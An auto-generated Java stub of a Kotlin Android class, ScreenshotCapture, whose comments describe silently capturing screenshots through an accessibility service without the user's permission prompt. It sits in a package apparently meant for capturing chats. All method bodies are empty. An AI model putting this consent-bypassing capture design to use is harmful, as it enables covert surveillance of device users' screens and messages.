package com.chats.capture.utils;

/**
 * Utility for capturing screenshots silently
 * Uses AccessibilityService.takeScreenshot() for Android 11+ (no user permission needed)
 * Falls back to alternative methods for older versions
 */
@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000(\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\u0018\u00002\u00020\u0001B\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003\u00a2\u0006\u0002\u0010\u0004J\u0010\u0010\u0005\u001a\u0004\u0018\u00010\u0006H\u0086@\u00a2\u0006\u0002\u0010\u0007J\u0010\u0010\b\u001a\u0004\u0018\u00010\u0006H\u0083@\u00a2\u0006\u0002\u0010\u0007J\u0010\u0010\t\u001a\u00020\n2\u0006\u0010\u000b\u001a\u00020\fH\u0003J\u0012\u0010\r\u001a\u0004\u0018\u00010\u00062\u0006\u0010\u000e\u001a\u00020\nH\u0002R\u000e\u0010\u0002\u001a\u00020\u0003X\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u000f"}, d2 = {"Lcom/chats/capture/utils/ScreenshotCapture;", "", "accessibilityService", "Landroid/accessibilityservice/AccessibilityService;", "(Landroid/accessibilityservice/AccessibilityService;)V", "captureScreenshot", "", "(Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "captureUsingAccessibilityService", "imageToBitmap", "Landroid/graphics/Bitmap;", "image", "Landroid/media/Image;", "saveBitmapToFile", "bitmap", "app_debug"})
public final class ScreenshotCapture {
    @org.jetbrains.annotations.NotNull()
    private final android.accessibilityservice.AccessibilityService accessibilityService = null;
    
    public ScreenshotCapture(@org.jetbrains.annotations.NotNull()
    android.accessibilityservice.AccessibilityService accessibilityService) {
        super();
    }
    
    /**
     * Capture screenshot and save to file
     * Returns file path if successful, null otherwise
     * Requires Android 11+ (API 30+) for AccessibilityService.takeScreenshot()
     */
    @org.jetbrains.annotations.Nullable()
    public final java.lang.Object captureScreenshot(@org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super java.lang.String> $completion) {
        return null;
    }
    
    /**
     * Capture screenshot using AccessibilityService.takeScreenshot() (Android 11+)
     * This method doesn't require MediaProjection permission
     */
    @android.annotation.SuppressLint(value = {"NewApi"})
    private final java.lang.Object captureUsingAccessibilityService(kotlin.coroutines.Continuation<? super java.lang.String> $completion) {
        return null;
    }
    
    /**
     * Convert Image to Bitmap
     */
    @android.annotation.SuppressLint(value = {"NewApi"})
    private final android.graphics.Bitmap imageToBitmap(android.media.Image image) {
        return null;
    }
    
    /**
     * Save bitmap to file
     */
    private final java.lang.String saveBitmapToFile(android.graphics.Bitmap bitmap) {
        return null;
    }
}